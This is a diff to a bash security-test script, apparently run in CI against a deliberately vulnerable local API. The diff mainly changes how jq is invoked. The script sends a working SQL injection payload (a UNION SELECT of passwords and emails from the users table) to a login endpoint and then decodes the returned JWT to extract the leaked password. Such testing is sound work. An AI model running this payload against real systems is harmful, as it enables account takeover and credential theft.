@@ -1,11 +1,13 @@
 #!/bin/bash
    
 HOST_URL=http://localhost:5600/api
+jq=jq
 
 # Check if the CI environment variable is set to true 
 if [ -n "${CI}" ] && [ "${CI}" = "true" ]; then 
     HOST_URL=http://backend:5500/api
     DOCKER_NETWORK=zap
+    jq=/home/zap/jq
 fi
 
 echo "
@@ -35,15 +37,15 @@ function test_sql_injection_to_retrieve_account_details() {
     echo "------------------------------------------------"
     echo "------------------------------------------------\n"
     echo "Testing SQL Injection to retrieve account details\n"
-    echo "curl -X POST $HOST_URL/client_login -H 'Content-Type: application/json' -d '{ \"userName\": \"spammer\" , \"email\": \"spam@email.com\" union select password || \":\" || email from users;--\" , \"password\": \"pwd1234\" }'\n"
+    echo "curl -X POST $HOST_URL/client_login -H 'Content-Type: application/json' -d '{ \"userName\": \"spammer\" , \"email\": \"spam@email.com\\\" union select password || \\\":\\\" || email from users;--\" , \"password\": \"pwd1234\" }'\n"
     
     # can retrieve the existing account login details using the below query
-    jwt() { jq -R 'split(".") | .[1] | @base64d | fromjson' <<< $1; }
+    jwt() { $jq -R 'split(".") | .[1] | @base64d | fromjson' <<< $1; }
 
-    auth_token=$(curl -X POST $HOST_URL/client_login -H 'Content-Type: application/json' -d '{ "userName": "spammer" , "email": "spam@email.com\" union select password || \":\" || email from users;--" , "password": "pwd" }' | jq -j '.token')
+    auth_token=$(curl -X POST $HOST_URL/client_login -H 'Content-Type: application/json' -d '{ "userName": "spammer" , "email": "spam@email.com\" union select password || \":\" || email from users;--" , "password": "pwd" }' | $jq -j '.token')
     jwt $auth_token
     json=$(jwt $auth_token)
-    password=$(echo "$json" | jq -r '.role' | cut -d':' -f1)
+    password=$(echo "$json" | $jq -r '.role' | cut -d':' -f1)
     export password=$password
     export auth_token=$auth_token
     echo $auth_token
